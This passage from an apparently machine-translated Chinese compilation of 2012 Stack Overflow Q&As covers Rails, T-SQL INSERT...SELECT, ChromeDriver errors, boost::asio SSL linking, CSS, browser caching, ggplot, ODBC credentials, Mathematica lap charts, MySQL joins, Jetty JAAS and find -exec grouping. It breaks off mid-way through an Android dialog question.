我知道 Rails 中扩展的对象`ActiveRecord::Base`可以使用一个构造函数，该构造函数将属性名称的哈希值转换为值，但我似乎无法找到该哈希构造函数的实际定义位置（似乎不是直接在 中`ActiveRecord::Base`）。谁能指出该构造函数存在的位置？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-01T01:09:12.433

在 rails 3.2.7 中，该`initialize`方法似乎在[`ActiveRecord::Base`](https://github.com/rails/rails/blob/v3.2.7/activerecord/lib/active_record/base.rb#L464-502).

在当前的 master 中（`c10202208982bfa02ffd16d1614992228391d781`在撰写本文时提交），[`Base`包括`ActiveRecord::Model`](https://github.com/rails/rails/blob/c10202208982bfa02ffd16d1614992228391d781/activerecord/lib/active_record/base.rb#L328)，而后者又[包括`ActiveRecord::Core`](https://github.com/rails/rails/blob/c10202208982bfa02ffd16d1614992228391d781/activerecord/lib/active_record/model.rb#L97)，其中[`initialize`定义](https://github.com/rails/rails/blob/c10202208982bfa02ffd16d1614992228391d781/activerecord/lib/active_record/core.rb#L169-200)了。看起来和3.2.7中的方法很相似。

# sql - 为从选择中获取的每一行执行插入？

> ID：11751030
> 
> 赞同：85
> 
> 时间：2012-08-01T00:38:10.620
> 
> 标签：sql, sql-server-2008, tsql, insert

我有许多记录需要插入到多个表中。每隔一列将是一个常数。

下面的伪代码很差 - 这就是我想要做的：

```
create table #temp_buildings
(
    building_id varchar(20)
)
insert into #temp_buildings (building_id) VALUES ('11070')
insert into #temp_buildings (building_id) VALUES ('11071')
insert into #temp_buildings (building_id) VALUES ('20570')
insert into #temp_buildings (building_id) VALUES ('21570')
insert into #temp_buildings (building_id) VALUES ('22570')

insert into property.portfolio_property_xref
        ( portfolio_id ,
          building_id ,
          created_date ,
          last_modified_date
        )
values
        ( 
            34 ,
            (
                select  building_id
                from    #temp_buildings
            ) ,
            getdate() ,
            null
        ) 
```

**意图：**为#temp_buildings 上的每条记录执行插入property.portfolio_property_xref

我想我可以用光标来做到这一点 - 但相信这会非常慢。由于这个练习将来可以重复，我宁愿以更快的方法解决这个问题，但我不确定如何。对于任何反馈，我们都表示感谢！

* * *

## 回答 #1

> 赞同：159
> 
> 时间：2012-08-01T00:40:10.403

```
INSERT INTO table1 ( column1 )
SELECT  col1
FROM    table2 
```

喜欢：

```
insert into property.portfolio_property_xref
( 
    portfolio_id ,
    building_id ,
    created_date ,
    last_modified_date
)
select
    34,
    building_id,
    getdate(),
    null
from
    #temp_buildings 
```

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2012-08-01T00:41:51.787

您将要使用`INSERT INTO SELECT FROM`（参见[SQL Fiddle with Demo](http://sqlfiddle.com/#!3/3e859/2)）

```
insert into property.portfolio_property_xref
( 
    portfolio_id ,
    building_id ,
    created_date ,
    last_modified_date
)
SELECT 34 ,
       building_id,
       getdate(),
       null
from    #temp_buildings 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2016-12-05T16:53:19.700

有点随机，但我觉得这可能对任何来这里回答这个问题的人有用。有时，我使用 Microsoft Excel VBA 来生成上面列出的部分 SQL 语句。当我在进行表构建和数据转换以建立新工作时，我发现这非常有用。这是一个非常简单的例子。它在两个独立的不相关系统之间建立了联系。然后，该链接允许我在将 3 个不相关的系统捆绑在一起的仓库环境中构建一个新表。无论如何，它允许我在几秒钟内创建超过 5000 行 SQL（供一次性使用 - 以及更大 ETL 任务的一小部分）。

```
Option Explicit

Dim arow As Integer
Dim acol As Integer
Dim lrow As Integer
Dim IsCellEmpty As String
Dim CustNo As Integer
Dim SkuLevel As Integer

Sub SkuLevelUpdate()

'find end ouf input file
arow = 1
acol = 1

Do
    IsCellEmpty = Cells(arow, acol).Value
    arow = arow + 1
Loop Until IsCellEmpty = ""

lrow = arow - 1

'Write SQL
arow = 2
acol = 5

Do
    CustNo = Cells(arow, 1)
    SkuLevel = Cells(arow, 4)
    Cells(arow, acol) = "INSERT INTO dbo.#TempSkuLevelRelationships (CustNo, SkuLevel) VALUES (" & CustNo & ", " & SkuLevel & ");"
    arow = arow + 1
Loop Until arow = lrow

End Sub 
```

是的，我知道所有关于 SQL 注入等的知识。我创建电子表格，将数据复制/粘贴到更大的 SQL 代码中，以便在数据当前不驻留在 SQL 表中时进行新的构造、表修改等

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-01T06:08:35.757

你是说你可以用光标来做。正如其他答案向您展示的那样，您不必这样做。SQL Server 是一个基于集合的 RDMS，它更能处理一组数据，然后处理单行。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-01T00:41:41.090

尝试这个

```
 insert into property.portfolio_property_xref
   ( 
      portfolio_id ,
      building_id ,
      created_date ,
      last_modified_date
   )
   Select
      34,
      building_id,
      GETDATE(),
      NULL
   From #temp_buildings 
```

# ruby-on-rails - Cucumber 和 Watir 突然停止工作

> ID：11751033
> 
> 赞同：7
> 
> 时间：2012-08-01T00:38:20.393
> 
> 标签：ruby-on-rails, selenium, cucumber, webdriver, watir

我一整天都在使用 Cucumber，即使我没有更改任何文件，它也只是停止工作。

它给了我一个错误，内容如下：

`Unable to either launch or connect to Chrome. Please check that ChromeDriver is up-to-date. Using Chrome binary at: /Applications/Google Chrome.app/Contents/MacOS/Google Chrome (Selenium::WebDriver::Error::UnknownError)`

任何想法，发生了什么？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-08-01T13:34:58.750

这是一个简单的分步操作，应该可以让一切在 OS X 上重新运行：

1.  在此处下载适用于 OS X 的最新预构建 chromedriver 服务器：[http ://code.google.com/p/chromedriver/downloads/list](http://code.google.com/p/chromedriver/downloads/list)
2.  将 chromedriver 可执行文件移动到您的 PATH。如果您在步骤 1 中将 chromedriver 保存（并解压缩）到您的下载文件夹，请尝试此操作（将您的用户名替换为`<your_username>`：

    ```
    sudo cp /Users/<your_username>/Downloads/chromedriver /usr/bin 
    ```

3.  利润！

`/usr/bin`绝对应该作为您的 PATH，但您可以通过键入`$PATH`Terminal.app 并按 Enter 来仔细检查所有可用的 PATH。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-01T08:42:42.863

今天 Selenium 停止在 Mac Os 中为我工作。我正在使用 python，我得到：

> “无法启动或连接到 Chrome。请检查 ChromeDriver 是否是最新的。在以下位置使用 Chrome 二进制文件：/Applications/Google Chrome.app/Contents/MacOS/Google Chrome'”错误。

解决方案：请更新您的驱动程序文件。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-08-01T12:52:54.723

Željko Filipin 是对的，我通过下载新的二进制文件解决了这个问题。显然，chrome 有一个静默更新。

替换二进制文件：

[http://code.google.com/p/chromedriver/downloads/list](http://code.google.com/p/chromedriver/downloads/list)

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-08-03T21:21:08.267

对于所有使用自制软件安装的人：似乎没有可用的最新版本。

[从http://code.google.com/p/chromedriver/downloads/list](http://code.google.com/p/chromedriver/downloads/list)下载 zip 文件，解压缩，然后`sudo mv chromedriver /usr/local/Cellar/chromedriver/20.0.1133.0/bin`将当前版本替换为最新版本（路径中的版本不会反映实际的 chromedriver 版本方式，但是嘿，它会再次工作，直到自制程序更新其 chromedriver 配方）。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2012-08-01T08:38:47.270

我的猜测是 Chrome 在后台默默更新。确保您拥有最新的[selenium-webdriver gem](https://rubygems.org/gems/selenium-webdriver)和[chromedriver](http://code.google.com/p/chromedriver/downloads/list)。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2012-11-26T20:28:38.537

Homebrew 现在有最新的 chromedriver，所以如果你使用 homebrew，你需要做的就是

```
$ brew unlink chromedriver
$ brew install chromedriver 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2013-12-21T23:30:01.390

尝试进行更新冲泡

`brew update`

`brew upgrade`

你应该很好

# c++ - Xcode 4 中的 boost::asio::ssl 链接错误

> ID：11751038
> 
> 赞同：1
> 
> 时间：2012-08-01T00:39:02.367
> 
> 标签：c++, xcode4, compiler-errors, openssl, boost-asio

我在 Xcode 中有一个简单的项目——它实际上还没有做任何事情，只包括`boost::asio::ssl`：

```
// main.cpp

#include <iostream>
#include <string>
#include <boost/asio.hpp>
#include <boost/asio/ssl.hpp>

using namespace std ;

int main (int argc, const char * argv [] ) {
    return 0 ;
} 
```

我将它与`libssl.dylib`and链接，`libboost_system.dylib`并在构建时得到它：

```
Undefined symbols for architecture x86_64:
  "_CONF_modules_unload", referenced from:
      boost::asio::ssl::detail::openssl_init_base::do_init::~do_init() in main.o
  "_CRYPTO_cleanup_all_ex_data", referenced from:
      boost::asio::ssl::detail::openssl_init_base::do_init::~do_init() in main.o
  "_CRYPTO_num_locks", referenced from:
      boost::asio::ssl::detail::openssl_init_base::do_init::do_init() in main.o
  "_CRYPTO_set_id_callback", referenced from:
      boost::asio::ssl::detail::openssl_init_base::do_init::do_init() in main.o
      boost::asio::ssl::detail::openssl_init_base::do_init::~do_init() in main.o
  "_CRYPTO_set_locking_callback", referenced from:
      boost::asio::ssl::detail::openssl_init_base::do_init::do_init() in main.o
      boost::asio::ssl::detail::openssl_init_base::do_init::~do_init() in main.o
  "_ENGINE_cleanup", referenced from:
      boost::asio::ssl::detail::openssl_init_base::do_init::~do_init() in main.o
  "_ERR_free_strings", referenced from:
      boost::asio::ssl::detail::openssl_init_base::do_init::~do_init() in main.o
  "_ERR_reason_error_string", referenced from:
      boost::asio::error::detail::ssl_category::message(int) const in main.o
  "_ERR_remove_state", referenced from:
      boost::asio::ssl::detail::openssl_init_base::do_init::~do_init() in main.o
  "_EVP_cleanup", referenced from:
      boost::asio::ssl::detail::openssl_init_base::do_init::~do_init() in main.o
  "_OPENSSL_add_all_algorithms_noconf", referenced from:
      boost::asio::ssl::detail::openssl_init_base::do_init::do_init() in main.o
ld: symbol(s) not found for architecture x86_64
clang: error: linker command failed with exit code 1 (use -v to see invocation) 
```

是否还有其他一些我遗漏的图书馆或其他我忽略的东西？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-01T04:26:59.447

我认为您还需要链接 libcrypto`-lcrypto`

# html - 文本奇怪地对齐。

> ID：11751039
> 
> 赞同：0
> 
> 时间：2012-08-01T00:39:09.910
> 
> 标签：html, css

在下图中，我用红色勾勒了 3 个内容，第一个是带有单词的框的标题`'Final Fantasy IV'`，第二个是`'Sonic Chronicles: The Dark Brotherhood`，第三个是 Chrome 显示的标题的 css 样式。

我的问题是，在第一个框中，标记为`'Final Fantasy IV'`，您可以看到它看起来不错，并且没有重叠，但是在第二个框中，您可以看到一些字体重叠。我可以做些什么来解决这个问题？

谢谢你。

![在此处输入图像描述](../Images/8fa2973937fc3543bc997e69342f8731.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-01T00:42:36.533

> 我可以做些什么来解决这个问题？

CSS魔术：

```
position: relative; 
```

CSS`position`文档：

[http://www.w3.org/TR/CSS2/visuren.html#propdef-position](http://www.w3.org/TR/CSS2/visuren.html#propdef-position)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-01T00:43:36.137

我会想象文本上方的图像，即`resultIMG`d/l 需要时间，并且在浏览器进行计算时不会下载它。在使用 JS 设置等高列时，有时会看到这种情况，其中一个 htem 包含一个大图像。值得研究。如果可以，请尝试在 resultIMG 上设置高度

# html - 如果同时在图像的 src 和 div 的背景图像中使用，浏览器会下载图像两次吗？

> ID：11751041
> 
> 赞同：32
> 
> 时间：2012-08-01T00:39:21.583
> 
> 标签：html, css, browser

由于必要但难以解释的原因，我在 div 上设置了绝对定位的图像和背景图像。

我想确保一旦浏览器抓取了这些图像（它们非常大），它就不会重新抓取它们。

让我们假设`bg.jpg`以下代码中的图像是 500KB。以下代码是否会导致浏览器将整个图像下载两次，总共 1000KB？

```
<style>
    header {
        background: url(img/bg.jpg) center center fixed transparent;
    }
</style>

<header>
    <img src="img/bg.jpg" width="500" height="500">
</header> 
```

**编辑**：谢谢大家的出色回答。我只是想仔细检查并确保我没有导致用户重新下载这些非常大的图像。

* * *

## 回答 #1

> 赞同：35
> 
> 时间：2012-08-01T00:49:23.143

浏览器在缓存方面非常聪明。它应该只要求一次。

此外，当它向服务器请求图像时，它通常会发送图像请求，以及一些告诉服务器的标头。嘿，我想要这个图像，但我已经有了一个具有你告诉我的这些属性的图像上次你发给我的时候。

然后服务器可以响应`200`它的不同内容`304`意味着你拥有的内容相同，所以我不会再次发送它，使用你得到的那个..

其中一种方法使用[ETAG 标头](http://en.wikipedia.org/wiki/HTTP_ETag)，但还有更多。

您的服务器需要支持这一点，但大多数都支持。

此外，interweb 由一堆缓存组成，它们还会查看这些标头值并为您返回内容。这就是 web 扩展得如此之好的原因 ;-)

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-08-01T00:45:19.253

不，浏览器会缓存它。但是，根据用户的设置，浏览器可能会在下次请求页面时再次请求图像，例如，如果用户在页面访问之间清除缓存。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-08-01T00:46:12.133

不，它会下载一次，然后放在浏览器缓存中。下次引用该 URL 时，它将从缓存中查找图像，而不是从服务器中检索它。

# c# - 使用 Windows 安装项目安装独立的 WPF 应用程序并与添加/删除程序集成

> ID：11751045
> 
> 赞同：1
> 
> 时间：2012-08-01T00:39:54.677
> 
> 标签：c#, wpf, visual-studio-2010, windows-installer, setup-project

我有一个 Windows 安装项目，它安装 2 个 Windows 服务，复制一堆可执行文件和驱动程序文件，然后安装驱动程序。我想将 WPF 项目添加到我的解决方案中，然后使用与 ClickOnce 相同的行为进行部署——我希望在“添加/删除程序”列表中添加一个条目，并选择“卸载”。我知道如果不更新和重新部署 MSI，我将无法更新此程序，这与具有自动更新功能的 ClickOnce 不同。

我尝试将项目输出添加到自定义操作、文件系统、程序文件夹和桌面。这只会将我的 wpf 应用程序的最终 .exe 复制到这些区域，但不会将应用程序注册为系统应用程序的一部分。

实际安装项目在“添加/删除程序”中创建了一行，因此我可以卸载所有服务并从系统中删除复制的文件，但我还希望在 WPF 应用程序的“添加/删除程序”中再添加一行。

请让我知道是否有一种方法可以将 WPF 应用程序安装为我的 Windows 安装程序的一部分，如果安装项目正在被卸载或回滚，还有一种方法可以卸载。

谢谢，

米莎

# r - ggplot 从 csv 文件创建多线图

> ID：11751047
> 
> 赞同：3
> 
> 时间：2012-08-01T00:39:57.797
> 
> 标签：r, ggplot2

我对 ggplot 完全陌生（在某种程度上是 R）。我对可以使用 ggplot 创建的图形的质量感到震惊，我正在尝试学习如何使用 ggplot 创建一个简单的多线图。

不幸的是，我还没有找到任何教程可以帮助我接近我想要做的事情：

我有一个包含以下数据的 CSV 文件：

```
id,f1,f2,f3,f4,f5,f6
30,0.841933670833,0.842101814883,0.842759547545,1.88961562347,1.99808377527,0.841933670833
40,1.47207692205,1.48713866811,1.48717177671,1.48729643008,1.48743226992,1.48713866811
50,0.823895293045,0.900091982861,0.900710334491,0.901274168324,0.901413662472,0.901413662472 
```

我想绘制：

1.  X 轴上的第一列 (id)
2.  每个后续的“列”作为线图，在线的点之间进行平滑以创建一条漂亮的平滑线
3.  f1、f2 的传奇......
4.  指定线条颜色并在 f2 列的线条图中添加标记（例如十字，即“+”）（例如）。

我对ggplot真的很陌生，所以真的没有超越将文件读入R。

任何帮助我创建如上所述的情节，都将很有教育意义，并有助于减少 ggplot 学习曲线。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-01T00:50:12.307

```
dat <- structure(list(id = c(30L, 40L, 50L), f1 = c(0.841933670833, 
1.47207692205, 0.823895293045), f2 = c(0.842101814883, 1.48713866811, 
0.900091982861), f3 = c(0.842759547545, 1.48717177671, 0.900710334491
), f4 = c(1.88961562347, 1.48729643008, 0.901274168324), f5 = c(1.99808377527, 
1.48743226992, 0.901413662472), f6 = c(0.841933670833, 1.48713866811, 
0.901413662472)), .Names = c("id", "f1", "f2", "f3", "f4", "f5", 
"f6"), class = "data.frame", row.names = c(NA, -3L)) 
```

从这里我会使用`melt`. 阅读`?melt.data.frame`以获取更多信息。但是一句话，这将数据从“宽”格式转换为“长”格式。

```
library(reshape2)
dat.m <- melt(dat, id.vars='id')

> dat.m
   id variable     value
1  30       f1 0.8419337
2  40       f1 1.4720769
3  50       f1 0.8238953
4  30       f2 0.8421018
5  40       f2 1.4871387
6  50       f2 0.9000920
7  30       f3 0.8427595
8  40       f3 1.4871718
9  50       f3 0.9007103
10 30       f4 1.8896156
11 40       f4 1.4872964
12 50       f4 0.9012742
13 30       f5 1.9980838
14 40       f5 1.4874323
15 50       f5 0.9014137
16 30       f6 0.8419337
17 40       f6 1.4871387
18 50       f6 0.9014137
> 
```

然后绘制你想要的：

```
ggplot(dat.m, aes(x=id, y=value, colour=variable)) + 
  geom_line() +
  geom_point(data=dat.m[dat.m$variable=='f2',], cex=2) 
```

Where`aes`定义了美学，例如 x 值、y 值、颜色/颜色等。然后添加“层”。在前面的示例中，我为我在其中定义的`ggplot()`部分添加了一行，`geom_line()`并添加了一个点`geom_point`，我只将它们放在`f2`变量上。

下面，我添加了一条平滑线`geom_smooth()`。有关此功能的更多信息，请参阅文档，`?geom_smooth`.

```
ggplot(dat.m, aes(x=id, y=value, colour=variable)) + 
  geom_smooth() + 
  geom_point(data=dat.m[dat.m$variable=='f2',], shape=3) 
```

或所有人的形状。在这里我把形状放在美学中`ggplot()`。通过将它们放在这里，它们适用于所有连续的层，而不必每次都指定它们。但是，我可以覆盖`ggplot()`任何后续层中提供的值：

```
ggplot(dat.m, aes(x=id, y=value, colour=variable, shape=variable)) + 
  geom_smooth() + 
  geom_point() +
  geom_point(data=dat, aes(x=id, y=f2, color='red'), size=10, shape=2) 
```

然而，一点点的`ggplot`理解只是需要时间。完成文档和网站上给出的一些示例`ggplot2`。如果你的经历和我的一样，经过几天或几周的斗争，它最终会成功。关于数据，如果您将数据分配给`dat`，则代码不会更改。 `dat <- read.csv(...)`. 我不用`data`作变量，因为它是一个内置函数。

# odbc - 如何避免在 Linux 上的 .odbc.ini 文件中存储用户名/密码？

> ID：11751058
> 
> 赞同：2
> 
> 时间：2012-08-01T00:41:08.717
> 
> 标签：odbc, teradata, unixodbc, stata

我正在通过 ODBC 和 Ubuntu 服务器（12.04 LTS）上的 Stata 连接到 Teradata 数据库。一切正常，除了我的 TD 用户 ID 和密码存储在 .odbc.ini 文件中，这似乎是个糟糕的主意。另一种方法是在Stata中输入它们，这看起来更糟而且很尴尬。有没有办法更安全地做到这一点？我用来 ssh 进入服务器的登录信息与 TD 数据库同步。似乎应该可以传递该信息。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-02T08:51:25.177

在 ODBC 术语中，您不需要在任何 ODBC ini 文件中存储用户名/密码。ODBC [SQLConnect](http://msdn.microsoft.com/en-us/library/windows/desktop/ms711810%28v=vs.85%29.aspx)和[SQLDriverConnect](http://msdn.microsoft.com/en-us/library/windows/desktop/ms715433%28v=vs.85%29.aspx)都支持在调用时传入用户名/密码。

SQLDriverConnect 需要您的 InConnectionString 中的某些内容，例如“DSN=YourDataSourceName;UID=username;PWD=password”。

您可以更进一步，将整个 DSN 作为命令行参数传递，这意味着您不需要 ini 文件中的 ODBC 数据源。我确信其中一位论坛读者可以为您发布来自 Teradata 的样本。

至于从您的 SSH 登录中传递用户名和密码。您的应用程序需要捕获它并将其传递给 ODBC。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-01T11:35:48.950

如果您想在您的 odbc.ini 文件或 Ubuntu 服务器上可能包含用户凭据的其他文件周围建立更精细的安全性，我强烈建议使用[访问控制列表](https://help.ubuntu.com/community/FilePermissionsACLs)(ACL)。除了典型的 Owner::Group::World 权限之外，您还可以将权限指定给特定用户，以决定是否允许或拒绝给定文件的显式权限。

有关 Teradata 安全性的其他选项包括使用 LDAP 身份验证（如果您的环境支持）。在 Teradata 上配置 LDAP 超出了 SO 的范围，并且在许多情况下是与 Teradata 的信息安全 CoE 的可计费的专业服务合作。

# wolfram-mathematica - 重新审视赛车圈表

> ID：11751062
> 
> 赞同：2
> 
> 时间：2012-08-01T00:41:32.853
> 
> 标签：wolfram-mathematica, plot

这是我第一次发帖，所以如果根据预先存在的问题提出新问题是不好的形式，我深表歉意。

我正在尝试创建一个类似于此处介绍的“圈表”：

[使用 ListLinePlot 的赛车圈图表](https://stackoverflow.com/questions/5655224/motorsport-lap-chart-using-listlineplot)

我的需要有点曲折。我正在绘制不同运动的圈速位置，我的数据结构不同。数据按车队和每圈完成时车队所处的位置列出。例如，这里是一个数据样本：

```
BRA = {03, 01, 01, 01};
CAN = {14, 14, 06, 10};
CRO = {10, 08, 11, 12};
DEN = {05, 05, 04, 11};
FRA = {13, 11, 14, 13};
GBR = {04, 02, 02, 02};
GER = {15, 15, 12, 09};
GRE = {16, 16, 16, 16};
IRL = {01, 03, 08, 06};
NOR = {02, 04, 09, 05};
NZL = {06, 06, 05, 08};
POL = {08, 07, 03, 03};
POR = {11, 13, 15, 15};
SUI = {07, 09, 10, 07};
SWE = {09, 10, 07, 04};
USA = {12, 12, 13, 14}; 
```

在这个例子中，巴西在第一圈结束时排在第三位，然后在第二圈结束时进入第一，保持第三圈的位置，然后到达终点。

我已经创建了我需要的图表，方法是手动重新键入数据以适应前面示例中发布的代码，但必须有一种更有效的方法。任何建议表示赞赏。

另一个问题......目前在给定一圈结束时的位置是均匀分布的，但在真正的比赛中，第一名比第二名领先 20 秒，而第三名可能领先 10 秒。有没有办法绘制每个位置以反映下一个竞争对手之前的相对时间？

这是我当前的工作代码：

```
data = {{09, 10, 01, 06, 04, 11, 14, 12, 15, 03, 13, 16, 05, 02, 07, 08}, 
{01, 06, 09, 10, 04, 11, 12, 03, 14, 15, 05, 16, 13, 02, 07, 08}, 
{01, 06, 12, 04, 11, 02, 15, 09, 10, 14, 03, 07, 16, 05, 13, 08}, 
{01, 06, 12, 15, 10, 09, 14, 11, 07, 02, 04, 03, 05, 16, 13, 08}};

{p, n} = {Max@data, Length@data};

ListLinePlot[
 Replace[Array[data~Position~# &, 
   p], {lap_, y_} :> {lap - 1, -y}, {2}], 

Frame -> True,

FrameLabel -> {"Rounding", "Position", "Rounding", 
   "Final Positions"}, GridLines -> {Range[0, n + 1], None},

FrameTicks -> {
{{{-1, "IRL"}, {-2, "NOR"}, {-3, "BRA"}, {-4, "GBR"}, {-5, 
  "DEN"}, {-6, "NZL"}, {-7, "SUI"}, {-8, "POL"}, {-9, 
  "SWE"}, {-10, "CRO"}, {-11, "POR"}, {-12, "USA"}, {-13, 
  "FRA"}, {-14, "CAN"}, {-15, "GER"}, {-16, "GRE"}},

 {{-1, "1 BRA"}, {-2, "2 GBR"}, {-3, "3 POL"}, {-4, "4 SWE"}, {-5, 
  "5 NOR"}, {-6, "6 IRL"}, {-7, "7 SUI"}, {-8, "8 NZL"}, {-9, 
  "9 GER"}, {-10, "10 CAN"}, {-11, "11 DEN"}, {-12, 
  "12 CRO"}, {-13, "13 FRA"}, {-14, "14 USA"}, {-15, 
  "15 POR"}, {-16, "16 GRE"}}},

{{{0, "W1"}, {1, "L1"}, {2, "W2"}, {3, "F"}},
{{0, "W1"}, {1, "L1"}, {2, "W2"}, {3, "F"}}}},

PlotRange -> {Automatic, {-.7, -.3 - p}},

PlotStyle -> Thickness[.003]] 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-01T01:10:50.420

在这里，您将了解如何以最少的手动工作重新格式化您的数据。

```
tot = {
  BRA = {03, 01, 01, 01},  CAN = {14, 14, 06, 10},  CRO = {10, 08, 11, 12},  
  DEN = {05, 05, 04, 11},  FRA = {13, 11, 14, 13},  GBR = {04, 02, 02, 02},
  GER = {15, 15, 12, 09},  GRE = {16, 16, 16, 16},  IRL = {01, 03, 08, 06},
  NOR = {02, 04, 09, 05},  NZL = {06, 06, 05, 08},  POL = {08, 07, 03, 03},
  POR = {11, 13, 15, 15},  SUI = {07, 09, 10, 07},  SWE = {09, 10, 07, 04},
  USA = {12, 12, 13, 14}} 
```

然后做

```
data = Ordering /@ Transpose@tot 
```

并在您提到的问题中使用@DavidCarraher 的答案。

![数学图形](../Images/d7ebdb968b558cb1e467889c209c8876.png)

**编辑**

如果您有每个团队（每圈）的时间安排，这里有一个用于绘制时间标度图的骨架：

```
lapTimes   = RandomReal[{0, 1}, {10, 5}];(*ten teams,five laps*)
ListLinePlot[Accumulate /@ lapTimes, PlotRange -> {{1, 5}, All}] 
```

![数学图形](../Images/a5bf86fdee41af0ef90c31657a66dffa.png)

最后的下线是获胜者（*消耗的时间更少*）

# mysql - 如何使用 MySQL 选择 2 个子记录？

> ID：11751065
> 
> 赞同：0
> 
> 时间：2012-08-01T00:41:44.470
> 
> 标签：mysql, select

我在 MySQL 中有一张表，结构如下

```
user_mst
----------------
user_id
user_name
left_id        (fk to user_mst->user_id)
right_id       (fk to user_mst->user_id) 
```

现在我想以假设的方式选择记录，

```
user_id = 1 
left_id = 2
right_id = 3 
```

现在，如果我使用 User ID = 1 查询记录，它应该打印 ID 为 2 和 3 的用户名。

**抱歉问题更新，我想打印 left_id 和 right_id 的 2 条单独记录。**

那么我该怎么做呢？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-01T01:00:41.637

```
SELECT
u2.*
FROM users u1
JOIN users u2 ON u2.user_id IN (u1.left_id, u1.right_id)
WHERE u1.user_id  = 1 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-01T00:58:46.993

像这样的东西可能会起作用

```
SELECT user_name, u1.user_name as LeftUser, u2.user_name as RightUser
FROM user_mst u0
LEFT OUTER JOIN user_mst u1 on u1.user_id = u0.left_id
LEFT OUTER JOIN user_mst u2 on u2.user_id = u0.right_id
WHERE user_id = ? 
```

# java - 将注册表单添加到受 JAAS 保护的 servlet

> ID：11751067
> 
> 赞同：3
> 
> 时间：2012-08-01T00:41:58.677
> 
> 标签：java, servlets, jetty, jaas

对于我的 Java Web 应用程序，我使用 JAAS 进行身份验证和授权。任何东西都受到保护，但登录和错误页面，因此我配置了我的码头：

```
ConstraintMapping cm = new ConstraintMapping();
cm.setConstraint(constraint);
cm.setPathSpec("/*"); 
```

现在我想提供一个注册页面，有没有办法为路径规范定义一个例外？就我在源代码中测试和看到的而言，正则表达式在这里不起作用。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-01T10:48:59.483

这可以通过**约束松弛**来解决。您可以在约束映射中添加另一个约束，这将放宽对 的更一般的约束`/*`：

```
Constraint relaxation = new Constraint();
relaxation.setName(Constraint.ANY_ROLE);
relaxation.setAuthenticate(false);

ConstraintMapping rm = new ConstraintMapping();
rm.setConstraint(relaxation);
rm.setPathSpec("/signup"); 
```

然后您将此约束也添加到您的`ContextSecurityHandler`

```
csh.addConstraintMapping(rm); 
```

# bash - 为什么不会 -exec 运行？

> ID：11751069
> 
> 赞同：0
> 
> 时间：2012-08-01T00:42:36.790
> 
> 标签：bash, shell, unix

我使用下面的脚本作为清理脚本。find 部分返回正确的结果，但由于某种原因 -exec 部分没有运行。

```
find /users/rhysparker/downloads/ -maxdepth 1 -iname \*.pkg -o -iname \*.app -o -iname \*.dmg -exec mv {} /folder/location/ \; 
```

任何帮助，将不胜感激。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-01T00:54:51.930

该`-o`操作的优先级较低，因此您`-exec`只能与`*.dmg`测试绑定。使用括号将语句正确分组。（并引用它们，以便 shell 将它们传递给`find`）。

```
find /users/rhysparker/downloads/ -maxdepth 1 \( -iname \*.pkg -o -iname \*.app -o -iname \*.dmg \) -exec mv {} /folder/location/ \; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-01T01:11:31.713

在`expr1 -o expr2`中，如果`expr1`为真，`expr2`则不会评估 。

在您的命令中：

```
-iname \*.pkg OR
-iname \*.app OR
-iname \*.dmg AND -exec mv {} /folder/location/ \; 
```

如果前两个之一为真，则不会评估最后一个。所以你必须使用`()`来改变expr：

```
find /users/rhysparker/downloads/ -maxdepth 1 \( -iname \*.pkg -o -iname \*.app -o -iname \*.dmg \) -exec mv {} /folder/location/ \; 
```

现在，它变成：

```
(-iname \*.pkg OR -iname \*.app OR -iname \*.dmg) AND
-exec mv {} /folder/location/ \; 
```

这样可以确保在`-exec`找到文件时对其进行评估。

# android - 警报对话框未显示，请告诉我该怎么做

> ID：11751071
> 
> 赞同：0
> 
> 时间：2012-08-01T00:43:24.047
> 
> 标签：android, google-maps, android-alertdialog

我不知道我的代码有什么问题，因为我什么都试过了。我创建了警报对话框，并且我看到的所有网络都向其他人显示了警报对话框。我的应用程序不显示对话框。这是 Main.java：

```
package com.natasam.mapstwo;

import java.util.List;

import android.app.AlertDialog;
import android.app.AlertDialog.Builder;
import android.content.DialogInterface;
import android.os.Bundle;
import android.view.MotionEvent;

import com.google.android.maps.MapActivity;
import com.google.android.maps.MapView;
import com.google.android.maps.Overlay;

public class Main extends MapActivity {
    MapView map;
    long start;
    long stop;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
        map= (MapView)findViewById(R.id.mvMain);
        map.setBuiltInZoomControls(true);   

        Touch t= new Touch();
        List<Overlay>  overlayList = map.getOverlays();
        overlayList.add(t);

    }

    @Override
    protected boolean isRouteDisplayed() {

        return false;
    }

    class Touch extends Overlay{
        public boolean OnTouchEvent(MotionEvent e, MapView v){
            if(e.getAction()== MotionEvent.ACTION_DOWN){
              start=e.getEventTime();

          }
          if(e.getAction()== MotionEvent.ACTION_UP){
              stop=e.getEventTime();
          }
          if(stop- start > 1500){
            Builder alert=new AlertDialog.Builder(Main.this);

              alert.setTitle("pick an option");
              alert.setMessage("You must pick an option");
              alert.setPositiveButton("option 1", new DialogInterface.OnClickListener() {

